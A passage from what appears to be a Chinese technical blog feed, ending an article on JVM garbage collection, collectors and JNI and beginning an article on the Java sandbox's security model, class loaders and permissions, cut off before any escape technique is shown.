GC。只不过在这个区域发生GC的条件非常严苛，必须符合以下三种条件才会被回收：</p><ul><li>所有实例被回收</li><li>加载该类的ClassLoader被回收</li><li>Class对象无法通过任何途径访问（包括反射）</li></ul><h3 id="第一次GC"><a href="#第一次GC" class="headerlink" title="第一次GC"></a>第一次GC</h3><p>在不断创建对象的过程中，当Eden区域被占满，此时会开始做Young GC也叫Minor GC：</p><ol><li>第一次GC时Survivous中S0区和S1区都为空，将其中一个作为To Survivor(用来存储Eden区域执行GC后不能被回收的对象)。比如：将S0作为To Survivor，则S1为From Survivor。</li><li>将Eden区域经过GC不能被回收的对象存储到To Survivor（S0）区域（此时Eden区域的内存会在垃圾回收的过程中全部释放），但如果To Survivor（S0）被占满了，Eden中剩下不能被回收对象只能存放到Old区域。</li><li>将Eden区域空间清空，此时From Survivous区域（S1）也是空的。</li><li>S0与S1互相切换标签，S0为From Survivor，S1为To Survivor。</li></ol><p><img src="/2020/05/08/浅析JVM/16.png" alt=""></p><h3 id="第二次及之后的GC"><a href="#第二次及之后的GC" class="headerlink" title="第二次及之后的GC"></a>第二次及之后的GC</h3><p>当第二次Eden区域被占满时，此时开始做GC：</p><ol><li>将Eden和From Survivor(S0)中经过GC未被回收的对象迁移到To Survivor(S1)，如果To Survious(S1)区放不下，将剩下的不能回收对象放入Old区域；</li><li>将Eden区域空间和From Survivor（S0）区域空间清空；</li><li>S0与S1互相切换标签，S0为To Survivor，S1为From Survivor。</li></ol><p><img src="/2020/05/08/浅析JVM/17.png" alt=""></p><p>第三、第四次依次类推，始终保证S0和S1有一个空的，用来存储临时对象，用于交换空间的目的。反反复复多次没有被淘汰的对象，将会被放入Old区域中，默认15次（由参数<code>--XX:MaxTenuringThreshold=15</code>决定）。</p><h3 id="垃圾回收算法"><a href="#垃圾回收算法" class="headerlink" title="垃圾回收算法"></a>垃圾回收算法</h3><h4 id="根搜索算法"><a href="#根搜索算法" class="headerlink" title="根搜索算法"></a>根搜索算法</h4><p>根搜索算法是从离散数学中的图论引入的，程序把所有引用关系看作一张图，从一个节点GC ROOT开始，寻找对应的引用节点，找到这个节点后，继续寻找这个节点的引用节点。当所有的引用节点寻找完毕后，剩余的节点则被认为是没有被引用到的节点，即无用的节点。</p><p><img src="/2020/05/08/浅析JVM/18.png" alt=""></p><p>上图红色为无用的节点，可以被回收。</p><p>目前Java中可以作为GC ROOT的对象有：</p><ul><li>虚拟机栈中引用的对象（本地变量表）</li><li>方法区中静态属性引用的对象</li><li>方法区中常量引用的对象</li><li>本地方法栈中引用的对象（Native对象）</li></ul><p>基本所有GC算法都引用根搜索算法这种概念。</p><h4 id="标记-清除算法"><a href="#标记-清除算法" class="headerlink" title="标记-清除算法"></a>标记-清除算法</h4><p>标记-清除算法采用从根集合进行扫描，对存活的对象进行标记，标记完毕后，再扫描整个空间中未被标记的对象进行直接回收。</p><p>标记-清除算法不需要进行对象的移动，并且仅对不存活的对象进行处理，在存活的对象比较多的情况下极为高效，但由于标记-清除算法直接回收不存活的对象，并没有对还存活的对象进行整理，因此会导致内存碎片。</p><p>如图：</p><p><img src="/2020/05/08/浅析JVM/19.png" alt=""></p><h4 id="复制算法"><a href="#复制算法" class="headerlink" title="复制算法"></a>复制算法</h4><p>复制算法将内存划分为两个区间，使用此算法时，所有动态分配的对象都只能分配在其中一个区间（活动区间），而另外一个区间（空闲区间）则是空闲的。</p><p>复制算法采用从根集合扫描，将存活的对象复制到空闲区间，当扫描完毕活动区间后，会的将活动区间一次性全部回收。此时原本的空闲区间变成了活动区间。下次GC时候又会重复刚才的操作，依次循环。</p><p>复制算法在存活对象比较少的时候，极为高效，但是带来的成本是牺牲一半的内存空间用于进行对象的移动。所以复制算法的使用场景，必须是对象的存活率非常低才行，而且最重要的是，我们需要克服50%内存的浪费。</p><p>如图：</p><p><img src="/2020/05/08/浅析JVM/20.png" alt=""></p><h4 id="标记-整理算法"><a href="#标记-整理算法" class="headerlink" title="标记-整理算法"></a>标记-整理算法</h4><p>标记-整理算法采用标记-清除算法一样的方式进行对象的标记、清除，但在回收不存活的对象占用的空间后，会将所有存活的对象往左端空闲空间移动，并更新对应的指针。</p><p>标记-整理算法是在标记-清除算法之上，又进行了对象的移动排序整理，因此成本更高，但却解决了内存碎片的问题。</p><p>JVM为了优化内存的回收，使用了分代回收的方式，对于新生代内存的回收（Minor GC）主要采用复制算法。而对于老年代的回收（Major GC），大多采用标记-整理算法。</p><p>如图：</p><p><img src="/2020/05/08/浅析JVM/21.png" alt=""></p><h3 id="垃圾回收器"><a href="#垃圾回收器" class="headerlink" title="垃圾回收器"></a>垃圾回收器</h3><p>新生代收集器：</p><ul><li>Serial（-XX:+UseSerialGC）</li><li>ParNew（-XX:+UseParNewGC）</li><li>ParallelScavenge（-XX:+UseParallelGC）</li><li>G1收集器</li></ul><p>老年代收集器：</p><ul><li>SerialOld（-XX:+UseSerialOldGC）</li><li>ParallelOld（-XX:+UseParallelOldGC）</li><li>CMS（-XX:+UseConcMarkSweepGC）</li><li>G1收集器</li></ul><h4 id="Serial（-XX-UseSerialGC）"><a href="#Serial（-XX-UseSerialGC）" class="headerlink" title="Serial（-XX:+UseSerialGC）"></a>Serial（-XX:+UseSerialGC）</h4><p>从名字我们可以看出，这是一个串行收集器。</p><p>Serial收集器是Java虚拟机中最基本、历史最悠久的收集器。在JDK1.3之前是Java虚拟机新生代收集器的唯一选择。目前也是ClientVM下ServerVM 4核4GB以下机器默认垃圾回收器。Serial收集器并不是只能使用一个CPU进行收集，而是当JVM需要进行垃圾回收的时候，需暂停所有的用户线程，直到回收结束。</p><p>使用算法：复制算法</p><p><img src="/2020/05/08/浅析JVM/22.png" alt=""></p><p>Serial收集器虽然是最老的，但是它对于限定单个CPU的环境来说，由于没有线程交互的开销，专心做垃圾收集，所以它在这种情况下是相对于其他收集器中最高效的。</p><p>JVM中文名称为Java虚拟机，因此它像一台虚拟的电脑在工作，而其中的每一个线程都被认为是JVM的一个处理器，因此图中的CPU0、CPU1实际上为用户的线程，而不是真正的机器CPU，不要误解哦。</p><h4 id="SerialOld（-XX-UseSerialGC）"><a href="#SerialOld（-XX-UseSerialGC）" class="headerlink" title="SerialOld（-XX:+UseSerialGC）"></a>SerialOld（-XX:+UseSerialGC）</h4><p>SerialOld是Serial收集器的老年代收集器版本，它同样是一个单线程收集器，这个收集器目前主要用于Client模式下使用。如果在Server模式下，它主要还有两大用途：一个是在JDK1.5及之前的版本中与Parallel Scavenge收集器搭配使用，另外一个就是作为CMS收集器的后备预案，如果CMS出现Concurrent Mode Failure，则SerialOld将作为后备收集器。</p><p>使用算法：标记-整理算法</p><p>运行示意图与上图一致。</p><h4 id="ParNew（-XX-UseParNewGC）"><a href="#ParNew（-XX-UseParNewGC）" class="headerlink" title="ParNew（-XX:+UseParNewGC）"></a>ParNew（-XX:+UseParNewGC）</h4><p>ParNew收集器其实就是Serial收集器的多线程版本，除了使用多条线程进行垃圾收集之外，其余行为包括Serial收集器可用的所有控制参数、收集算法、Stop The World、对象分配规则、回收策略等都与Serial收集器完全一样，在实现上，这两种收集器也共用了相当多的代码。</p><p>应用场景：ParNew收集器是许多运行在Server模式下的虚拟机中首选的新生代收集器。有一个很重要的原因是除了Serial收集器外，目前只有它能与CMS收集器配合工作。</p><p>使用算法：复制算法</p><p><img src="/2020/05/08/浅析JVM/23.png" alt=""></p><p>ParNew是许多运行在Server模式下的JVM首选的新生代收集器。但是在单CPU的情况下，它的效率远远低于Serial收集器，所以一定要注意使用场景。</p><h4 id="ParallelScavenge（-XX-UseParallelGC）"><a href="#ParallelScavenge（-XX-UseParallelGC）" class="headerlink" title="ParallelScavenge（-XX:+UseParallelGC）"></a>ParallelScavenge（-XX:+UseParallelGC）</h4><p>ParallelScavenge又被称为吞吐量优先收集器，和ParNew 收集器类似，是一个新生代收集器。</p><p>使用算法：复制算法</p><p>ParallelScavenge收集器的目标是达到一个可控件的吞吐量，所谓吞吐量就是CPU用于运行用户代码的时间与CPU总消耗时间的比值，即吞吐量 = 运行用户代码时间 / （运行用户代码时间 + 垃圾收集时间）。</p><p>如果虚拟机总共运行了100分钟，其中垃圾收集花了1分钟，那么吞吐量就是99% 。</p><h4 id="ParallelOld（-XX-UseParallelOldGC）"><a href="#ParallelOld（-XX-UseParallelOldGC）" class="headerlink" title="ParallelOld（-XX:+UseParallelOldGC）"></a>ParallelOld（-XX:+UseParallelOldGC）</h4><p>ParallelOld是并行收集器，和SerialOld一样，ParallelOld是一个老年代收集器，是老年代吞吐量优先的一个收集器。</p><p>这个收集器在JDK1.6之后才开始提供的，在此之前，ParallelScavenge只能选择SerialOld来作为其老年代的收集器，这严重拖累了ParallelScavenge整体的速度。而ParallelOld的出现后，“吞吐量优先”收集器才名副其实！</p><p>使用算法：标记-整理算法</p><p><img src="/2020/05/08/浅析JVM/24.png" alt=""></p><p>在注重吞吐量与CPU数量大于1的情况下，都可以优先考虑ParallelScavenge + ParalleloOld收集器。</p><h4 id="CMS-（-XX-UseConcMarkSweepGC）"><a href="#CMS-（-XX-UseConcMarkSweepGC）" class="headerlink" title="CMS （-XX:+UseConcMarkSweepGC）"></a>CMS （-XX:+UseConcMarkSweepGC）</h4><p>CMS是一个老年代收集器，全称 Concurrent Low Pause Collector，是JDK1.4后期开始引用的新GC收集器，在JDK1.5、1.6中得到了进一步的改进。它是对于响应时间的重要性需求大于吞吐量要求的收集器。对于要求服务器响应速度高的情况下，使用CMS非常合适。</p><p>CMS的一大特点，就是用两次短暂的暂停来代替串行或并行标记整理算法时候的长暂停。</p><p>使用算法：标记-清理</p><h5 id="CMS的执行过程"><a href="#CMS的执行过程" class="headerlink" title="CMS的执行过程"></a>CMS的执行过程</h5><p>CMS的执行过程如下：</p><ul><li><p>初始标记（STW initial mark）</p><p>在这个阶段，需要虚拟机停顿正在执行的应用线程，官方的叫法STW（Stop Tow World）。这个过程从根对象扫描直接关联的对象，并作标记。这个过程会很快的完成。</p></li><li><p>并发标记（Concurrent marking）</p><p>这个阶段紧随初始标记阶段，在“初始标记”的基础上继续向下追溯标记。注意这里是并发标记，表示用户线程可以和GC线程一起并发执行，这个阶段不会暂停用户的线程哦。</p></li><li><p>并发预清理（Concurrent precleaning）</p><p>这个阶段任然是并发的，JVM查找正在执行“并发标记”阶段时候进入老年代的对象（可能这时会有对象从新生代晋升到老年代，或被分配到老年代）。通过重新扫描，减少在一个阶段“重新标记”的工作，因为下一阶段会STW。</p></li><li><p>重新标记（STW remark）</p><p>这个阶段会再次暂停正在执行的应用线程，重新重根对象开始查找并标记并发阶段遗漏的对象（在并发标记阶段结束后对象状态的更新导致），并处理对象关联。这一次耗时会比“初始标记”更长，并且这个阶段可以并行标记。</p></li><li><p>并发清理（Concurrent sweeping）</p><p>这个阶段是并发的，应用线程和GC清除线程可以一起并发执行。</p></li><li><p>并发重置（Concurrent reset）</p><p>这个阶段任然是并发的，重置CMS收集器的数据结构，等待下一次垃圾回收。</p></li></ul><h5 id="CMS的缺点"><a href="#CMS的缺点" class="headerlink" title="CMS的缺点"></a>CMS的缺点</h5><ol><li>内存碎片。由于使用了 标记-清理 算法，导致内存空间中会产生内存碎片。不过CMS收集器做了一些小的优化，就是把未分配的空间汇总成一个列表，当有JVM需要分配内存空间的时候，会搜索这个列表找到符合条件的空间来存储这个对象。但是内存碎片的问题依然存在，如果一个对象需要3块连续的空间来存储，因为内存碎片的原因，寻找不到这样的空间，就会导致Full GC。</li><li>需要更多的CPU资源。由于使用了并发处理，很多情况下都是GC线程和应用线程并发执行的，这样就需要占用更多的CPU资源，也是牺牲了一定吞吐量的原因。</li><li>需要更大的堆空间。因为CMS标记阶段应用程序的线程还是执行的，那么就会有堆空间继续分配的问题，为了保障CMS在回收堆空间之前还有空间分配给新加入的对象，必须预留一部分空间。CMS默认在老年代空间使用68%时候启动垃圾回收。可以通过-XX:CMSinitiatingOccupancyFraction=n来设置这个阀值。</li></ol><h4 id="GarbageFirst（G1）"><a href="#GarbageFirst（G1）" class="headerlink" title="GarbageFirst（G1）"></a>GarbageFirst（G1）</h4><p>这是一个新的垃圾回收器，既可以回收新生代也可以回收老年代。</p><p>SunHotSpot1.6u14以上EarlyAccess版本加入了这个回收器，Sun公司预期SunHotSpot1.7发布正式版本。通过重新划分内存区域，整合优化CMS，同时注重吞吐量和响应时间。杯具的是Oracle收购这个收集器之后将其用于商用收费版收集器。因此目前暂时没有发现哪个公司使用它。</p><p>G1收集器的运作大致可划分为以下几个步骤：</p><ol><li>初始标记（Initial Marking）：初始标记阶段仅仅只是标记一下GC Roots能直接关联到的对象，并且修改TAMS（Next Top at Mark Start）的值，让下一阶段用户程序并发运行时，能在正确可用的Region中创建新对象，这阶段需要停顿线程，但耗时很短。</li><li>并发标记（Concurrent Marking）：并发标记阶段是从GC Root开始对堆中对象进行可达性分析，找出存活的对象，这阶段耗时较长，但可与用户程序并发执行。</li><li>最终标记（Final Marking）：最终标记阶段是为了修正在并发标记期间因用户程序继续运作而导致标记产生变动的那一部分标记记录，虚拟机将这段时间对象变化记录在线程Remembered Set Logs里面，最终标记阶段需要把Remembered Set Logs的数据合并到Remembered Set中，这阶段需要停顿线程，但是可并行执行。</li><li>筛选回收（Live Data Counting and Evacuation）：筛选回收阶段首先对各个Region的回收价值和成本进行排序，根据用户所期望的GC停顿时间来制定回收计划，这个阶段其实也可以做到与用户程序一起并发执行，但是因为只回收一部分Region，时间是用户可控制的，而且停顿用户线程将大幅提高收集效率。</li></ol><h3 id="GC中的相关问题"><a href="#GC中的相关问题" class="headerlink" title="GC中的相关问题"></a>GC中的相关问题</h3><h4 id="问题1：怎么定义活着的对象？"><a href="#问题1：怎么定义活着的对象？" class="headerlink" title="问题1：怎么定义活着的对象？"></a>问题1：怎么定义活着的对象？</h4><p>从根引用开始，对象的内部属性可能也是引用，只要能级联到的都被认为是活着的对象。</p><h4 id="问题2：什么是根？"><a href="#问题2：什么是根？" class="headerlink" title="问题2：什么是根？"></a>问题2：什么是根？</h4><p>本地变量引用，操作数栈引用，PC寄存器，本地方法栈引用等这些都是根。</p><h4 id="问题3：对象进入Old区域有什么坏处？"><a href="#问题3：对象进入Old区域有什么坏处？" class="headerlink" title="问题3：对象进入Old区域有什么坏处？"></a>问题3：对象进入Old区域有什么坏处？</h4><p>Old区域一般称为老年代，老年代与新生代不一样。新生代，我们可以认为存活下来的对象很少，而老年代则相反，存活下来的对象很多，所以JVM的堆内存，才是我们通常关注的主战场，因为这里面活着的对象非常多，所以发生一次FULL GC，来找出来所有存活的对象是非常耗时的，因此，我们应该避免FULL GC的发生。</p><h4 id="问题4：S0和S1一般多大，靠什么参数来控制，有什么变化？"><a href="#问题4：S0和S1一般多大，靠什么参数来控制，有什么变化？" class="headerlink" title="问题4：S0和S1一般多大，靠什么参数来控制，有什么变化？"></a>问题4：S0和S1一般多大，靠什么参数来控制，有什么变化？</h4><p>一般来说很小，我们大概知道它与Young差不多相差一倍的比例，设置的参数主要有两个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-XX:SurvivorRatio=8</span><br><span class="line">-XX:InitialSurvivorRatio=8</span><br></pre></td></tr></table></figure><p>第一个参数（-XX:SurvivorRatio）是Eden和Survivous区域比重（注意Survivous一般包含两个区域S0和S1，这里是一个Survivous的大小）。如果将-XX:SurvivorRatio=8设置为8，则说明Eden区域是一个Survivous区的8倍，换句话说S0或S1空间是整个Young空间的1/10，剩余的8/10由Eden区域来使用。</p><p>第二个参数（-XX:InitialSurvivorRatio）是Young/S0的比值，当其设置为8时，表示S0或S1占整个Young空间的1/8（或12.5%）。</p><h4 id="问题5：一个对象每次Minor-GC时，活着的对象都会在S0和S1区域转移，讲过MInor-GC多少次后，会进入Old区域呢？"><a href="#问题5：一个对象每次Minor-GC时，活着的对象都会在S0和S1区域转移，讲过MInor-GC多少次后，会进入Old区域呢？" class="headerlink" title="问题5：一个对象每次Minor GC时，活着的对象都会在S0和S1区域转移，讲过MInor GC多少次后，会进入Old区域呢？"></a>问题5：一个对象每次Minor GC时，活着的对象都会在S0和S1区域转移，讲过MInor GC多少次后，会进入Old区域呢？</h4><p>默认是15次，参数设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--XX:MaxTenuringThreshold=15</span><br></pre></td></tr></table></figure><p>计数器会在对象的头部记录它的交换次数。</p><h4 id="问题6：为什么发生FULL-GC会带来很大的危害？"><a href="#问题6：为什么发生FULL-GC会带来很大的危害？" class="headerlink" title="问题6：为什么发生FULL GC会带来很大的危害？"></a>问题6：为什么发生FULL GC会带来很大的危害？</h4><p>在发生FULL GC的时候，意味着JVM会安全的暂停所有正在执行的线程（Stop The World），来回收内存空间，在这个时间内，所有除了回收垃圾的线程外，其他有关JAVA的程序，代码都会静止，反映到系统上，就会出现系统响应大幅度变慢，卡机等状态。</p><h4 id="问题7：JVM-GC回收哪个区域内的垃圾？"><a href="#问题7：JVM-GC回收哪个区域内的垃圾？" class="headerlink" title="问题7：JVM GC回收哪个区域内的垃圾？"></a>问题7：JVM GC回收哪个区域内的垃圾？</h4><p>需要注意的是，JVM GC只回收堆区和方法区内的对象。而栈区的数据，在超出作用域后会被JVM自动释放掉，所以其不在JVM GC的管理范围内。</p><h4 id="问题8：JVM-GC怎么判断对象可以被回收了？"><a href="#问题8：JVM-GC怎么判断对象可以被回收了？" class="headerlink" title="问题8：JVM GC怎么判断对象可以被回收了？"></a>问题8：JVM GC怎么判断对象可以被回收了？</h4><ul><li>对象没有引用</li><li>作用域发生未捕获异常</li><li>程序在作用域正常执行完毕</li><li>程序执行了System.exit()</li><li>程序发生意外终止（被杀线程等）</li></ul><p>在Java程序中不能显式的分配和注销缓存，因为这些事情JVM都帮我们做了，那就是GC。</p><p>有些时候我们可以将相关的对象设置成null 来试图显示的清除缓存，但是并不是设置为null 就会一定被标记为可回收，有可能会发生逃逸。</p><p>将对象设置成null 至少没有什么坏处，但是使用System.gc() 便不可取了，使用System.gc() 时候并不是马上执行GC操作，而是会等待一段时间，甚至不执行，而且System.gc() 如果被执行，会触发Full GC ，这非常影响性能。</p><h4 id="问题9：JVM-GC什么时候执行？"><a href="#问题9：JVM-GC什么时候执行？" class="headerlink" title="问题9：JVM GC什么时候执行？"></a>问题9：JVM GC什么时候执行？</h4><p>Eden区空间不够存放新对象的时候，执行Minro GC。升到老年代的对象大于老年代剩余空间的时候执行Full GC，或者小于的时候被HandlePromotionFailure 参数强制Full GC 。调优主要是减少 Full GC 的触发次数，可以通过 NewRatio 控制新生代转老年代的比例，通过MaxTenuringThreshold 设置对象进入老年代的年龄阀值（后面会介绍到）。</p><h2 id="0x06-本地方法接口"><a href="#0x06-本地方法接口" class="headerlink" title="0x06 本地方法接口"></a>0x06 本地方法接口</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>JNI（Java Native Interface），本地方法接口。</p><p>简单来讲，一个Native Method就是一个Java调用非Java代码的接口，一个Native Method是这样一个Java方法：该方法的底层实现由非Java语言实现，比如C。这个特征并非Java特有，很多其他的编程语言都有这一机制，比如在C++中，你可以用extern “C” 告知C++编译器去调用一个C的函数。</p><p>在定义一个native method时，并不提供实现体（有些像定义一个Java interface），因为其实现体是由非Java语言在外面实现的。</p><p>本地接口的作用是融合不同的编程语言为Java所用，它的初衷是融合C/C++程序。</p><p>标识符native可以与其他所有的Java标识符连用，但是abstract除外。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 本地方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span>  <span class="class"><span class="keyword">class</span> <span class="title">IHaveNatives</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//abstract 没有方法体</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">abstractMethod</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//native 和 abstract不能共存，native是有方法体的，由C语言来实现</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">Native1</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">native</span> <span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">long</span> <span class="title">Native2</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">native</span> <span class="keyword">synchronized</span> <span class="keyword">private</span> <span class="keyword">float</span> <span class="title">Native3</span><span class="params">(Object o)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">native</span> <span class="keyword">void</span> <span class="title">Native4</span><span class="params">(<span class="keyword">int</span>[] array)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为何使用JNI"><a href="#为何使用JNI" class="headerlink" title="为何使用JNI"></a>为何使用JNI</h3><p>Java使用起来非常方便，然而有些层次的任务用Java实现起来不容易，或者我们对程序的效率很在意时，问题就来了。</p><ul><li>与Java环境外交互：有时Java应用需要与Java外面的环境交互，这是本地方法存在的主要原因。 你可以想想Java需要与一些底层系统，如擦偶偶系统或某些硬件交换信息时的情况。本地方法正式这样的一种交流机制：它为我们提供了一个非常简洁的接口，而且我们无需去了解Java应用之外的繁琐细节。</li><li>与操作系统交互（比如线程最后要回归于操作系统线程）：JVM支持着Java语言本身和运行库，它是Java程序赖以生存的平台，它由一个解释器（解释字节码）和一些连接到本地代码的库组成。然而不管怎样，它毕竟不是一个完整的系统，它经常依赖于一些底层系统的支持。这些底层系统常常是强大的操作系统。通过使用本地方法，我们得以用Java实现了jre的与底层系统的交互，甚至JVM的一些部分就是用C写的。还有，如果我们要使用一些Java语言本身没有提供封装的操作系统特性时，我们也需要使用本地方法。</li><li>Sun’s Java：Sun的解释器是用C实现的，这使得它能像一些普通的C一样与外部交互。jre大部分是用Java实现的，它也通过一些本地方法与外界交互。例如：类java.lang.Thread的setPriority()方法是用Java实现的，但是它实现调用的是该类里的本地方法setPriority0()。这个本地方法是用C实现的，并被植入JVM内部，在Windows 95的平台上，这个本地方法最终将调用Win32 setPriority() API。这是一个本地方法的具体实现由JVM直接提供，更多的情况是本地方法由外部的动态链接库（external dynamic link library）提供，然后被JVM调用。</li></ul><h2 id="0x07-执行引擎"><a href="#0x07-执行引擎" class="headerlink" title="0x07 执行引擎"></a>0x07 执行引擎</h2><p>参考：<a href="https://blog.csdn.net/it_gjw/article/details/80627661" target="_blank" rel="noopener">JVM字节码执行引擎</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;本文直接参考或引自网上文章。&lt;/p&gt;
&lt;h2 id=&quot;0x01-JVM简介&quot;&gt;&lt;a href=&quot;#0
      
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>浅析Java沙箱逃逸</title>
    <link href="https://www.mi1k7ea.com/2020/05/03/%E6%B5%85%E6%9E%90Java%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <id>https://www.mi1k7ea.com/2020/05/03/浅析Java沙箱逃逸/</id>
    <published>2020-05-03T08:11:24.000Z</published>
    <updated>2020-05-07T16:31:42.205Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Java沙箱"><a href="#0x01-Java沙箱" class="headerlink" title="0x01 Java沙箱"></a>0x01 Java沙箱</h2><p>程序员编写一个Java程序，默认的情况下可以访问该机器的任意资源，比如读取、删除一些文件或者网络操作等。当你把程序部署到正式的服务器上，系统管理员要为服务器的安全承担责任，那么他可能不敢确定你的程序会不会访问不该访问的资源，为了消除潜在的安全隐患，他可能有两种办法：</p><ol><li><p>让你的程序在一个限定权限的帐号下运行。</p></li><li><p>利用Java的沙箱机制来限定你的程序不能为非作歹。以下用于介绍该机制。</p></li></ol><h3 id="Java沙箱简介"><a href="#Java沙箱简介" class="headerlink" title="Java沙箱简介"></a>Java沙箱简介</h3><p>Java安全模型的核心就是Java沙箱（sandbox），什么是沙箱？沙箱是一个限制程序运行的环境。限制程序运行一方面是为了保护系统资源，同时另一方面也为了保护程序自己。沙箱主要限制系统资源访问，那系统资源包括什么？——CPU、内存、文件系统、网络。不同级别的沙箱对这些资源访问的限制也可以不一样。</p><p>所有的Java程序运行都可以指定沙箱，可以定制安全策略。</p><h3 id="Java中的安全模型"><a href="#Java中的安全模型" class="headerlink" title="Java中的安全模型"></a>Java中的安全模型</h3><p>在Java中将执行程序分成本地代码和远程代码两种，本地代码默认视为可信任的，而远程代码则被看作是不受信的。对于授信的本地代码，可以访问一切本地资源。而对于非授信的远程代码在早期的Java实现中，安全依赖于沙箱 (Sandbox) 机制。如下图：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/1.png" alt=""></p><p>但如此严格的安全机制也给程序的功能扩展带来障碍，比如当用户希望远程代码访问本地系统的文件时候，就无法实现。因此在后续的 Java1.1 版本中，针对安全机制做了改进，增加了安全策略，允许用户指定代码对本地资源的访问权限。如下图：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/2.png" alt=""></p><p>在 Java1.2 版本中，再次改进了安全机制，增加了代码签名。不论本地代码或是远程代码，都会按照用户的安全策略设定，由类加载器加载到虚拟机中权限不同的运行空间，来实现差异化的代码执行权限控制。如下图：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/3.png" alt=""></p><p>当前最新的安全机制实现，则引入了域 (Domain) 的概念。虚拟机会把所有代码加载到不同的系统域和应用域，系统域部分专门负责与关键资源进行交互，而各个应用域部分则通过系统域的部分代理来对各种需要的资源进行访问。虚拟机中不同的受保护域 (Protected Domain)，对应不一样的权限 (Permission)。存在于不同域中的类文件就具有了当前域的全部权限，如下图：</p><p><img src="/2020/05/03/浅析Java沙箱逃逸/4.png" alt=""></p><p>以上提到的都是基本的Java安全模型概念，在应用开发中还有一些关于安全的复杂用法，其中最常用到的API就是doPrivileged()。doPrivileged()方法能够使一段受信任代码获得更大的权限，甚至比调用它的应用程序还要多，可做到临时访问更多的资源。有时候这是非常必要的，可以应付一些特殊的应用场景。例如，应用程序可能无法直接访问某些系统资源，但这样的应用程序必须得到这些资源才能够完成功能。</p><h3 id="Java沙箱的基本组成"><a href="#Java沙箱的基本组成" class="headerlink" title="Java沙箱的基本组成"></a>Java沙箱的基本组成</h3><p>Java沙箱由以下几部分组成：</p><ul><li>字节码校验器（bytecode verifier）：确保Java类文件遵循Java语言规范。这样可以帮助Java程序实现内存保护。但是不是所有的类文件都会经过字节码校验，比如核心类。</li><li>类加载器（class loader）：所有的Java类都是通过类加载器加载的，可以自定义类加载器来设置加载类的权限。</li><li>存取控制器（access controller）：存取控制器可以控制核心API对操作系统的存取权限，而这个控制的策略设定，可以由用户指定。</li><li>安全管理器（security manager）：是核心API和操作系统之间的主要接口。实现权限控制，比存取控制器优先级高。</li><li>安全软件包（security package）：java.security下的类和扩展包下的类，允许用户为自己的应用增加新的安全特性，包括：<ul><li>安全提供者</li><li>消息摘要</li><li>数字签名</li><li>加密</li><li>鉴别</li></ul></li></ul><p>其中ClassLoader在如下三个方面对Java沙箱起作用：</p><ol><li>它防止恶意代码去干涉善意的代码；</li><li>它守护了被信任的类库边界；</li><li>它将代码归入保护域，确定了代码可以进行哪些操作。</li></ol><p>虚拟机为不同的ClassLoader载入的类提供不同的命名空间，命名空间由一系列唯一的名称组成，每一个被装载的类将有一个名字，这个命名空间是由Java虚拟机为每一个ClassLoader维护的，它们互相之间甚至不可见。</p><p>ClassLoader采用的机制是双亲委派模式。从最内层JVM自带ClassLoader开始加载，外层恶意同名类得不到加载从而无法使用；由于严格通过包来区分了访问域，外层恶意的类通过内置代码也无法获得权限访问到内层类，破坏代码就自然无法生效。</p><h3 id="Java沙箱的要素"><a href="#Java沙箱的要素" class="headerlink" title="Java沙箱的要素"></a>Java沙箱的要素</h3><h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><p>权限是指允许代码执行的操作。包含三部分：权限类型、权限名和允许的操作。权限类型是实现了权限的Java类名，是必需的。权限名一般就是对哪类资源进行操作的资源定位（比如一个文件名或者通配符、网络主机等），一般基于权限类型来设置，有的比如java.security.AllPermission不需要权限名。允许的操作也和权限类型对应，指定了对目标可以执行的操作行为，比如读、写等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">permission java.security.AllPermission;    <span class="comment">//权限类型</span></span><br><span class="line">permission java.lang.RuntimePermission <span class="string">"stopThread"</span>;    <span class="comment">//权限类型+权限名</span></span><br><span class="line">permission java.io.FilePermission <span class="string">"/tmp/foo"</span> <span class="string">"read"</span>;    <span 